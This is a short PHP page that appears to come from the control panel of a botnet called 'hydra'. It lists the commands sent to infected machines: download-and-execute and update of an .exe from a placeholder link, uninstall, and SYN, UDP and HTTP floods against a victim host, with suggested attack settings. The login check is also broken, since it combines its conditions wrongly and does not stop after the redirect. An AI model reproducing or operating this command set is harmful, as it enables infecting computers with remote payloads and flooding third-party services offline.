<?php
	session_start();
	if(!isset($_SESSION['hydra_loggedin']) && $_SESSION['hydra_loggedin'] != 1)
	{
		header("Location: http://www.google.com");
	}
	include("inc/config.php");
	include("inc/funcs.php");
	echo '
	<div class="font padding">
	<h2>Misc Commands:</h2>
	<ul>
	<li>Download & Execute: !dl*http://yourlink.com/yourfile.exe</li>
	<li>Update: !update*http://yourlink.com/yourfile.exe</li>
	<li>Uninstall: !remove</li>
	</ul>
	<h2>DDos Commands:</h2>
	<p><strong>All this commands without "http://"!</strong></p>
	<ul>
	<li>Syn Flood: !syn*www.victimhost.com*port*threads*sockets -- 2 Threads and 2 Sockets are OK (:</li>
	<li>UDP Flood: !udp*www.victimhost.com*port*threads*sockets*packetsize -- 2 Threads, 2 Sockets and 800 Packetsize are OK (:</li>
	<li>Http Flood: !http*www.victimhost.com</li>
	</ul>
	</div>'
?>